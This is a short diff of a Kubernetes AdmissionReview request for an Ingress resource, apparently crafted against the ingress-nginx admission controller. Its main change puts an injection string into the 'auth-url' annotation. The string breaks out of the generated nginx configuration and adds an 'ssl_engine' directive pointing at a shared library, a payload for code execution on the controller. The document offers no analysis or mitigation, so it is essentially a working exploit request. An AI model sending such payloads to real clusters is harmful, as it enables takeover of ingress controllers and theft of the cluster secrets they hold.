@@ -23,7 +23,7 @@
         "version": "v1",
         "resource": "ingresses"
       },
-      "name": "nginx",
+      "name": "nginx-ingress",
       "namespace": "nginx",
       "operation": "CREATE",
       "userInfo": {
@@ -34,18 +34,18 @@
         "kind": "Ingress",
         "apiVersion": "networking.k8s.io/v1",
         "metadata": {
-          "name": "nginx",
+          "name": "nginx-ingress",
           "namespace": "nginx",
           "creationTimestamp": null,
           "annotations": {
-            "nginx.ingress.kubernetes.io/auth-url": "xxx"
+            "nginx.ingress.kubernetes.io/auth-url": "http://example.com#;}}}\nssl_engine /path/to/shared-library.so;events {\nserver { location /aa { #"
           }
         },
         "spec": {
           "ingressClassName": "nginx",
           "rules": [
             {
-              "host": "nginx.nhatanhweb.website",
+              "host": "nginx.nhatanhmovie.website",
               "http": {
                 "paths": [
                   {
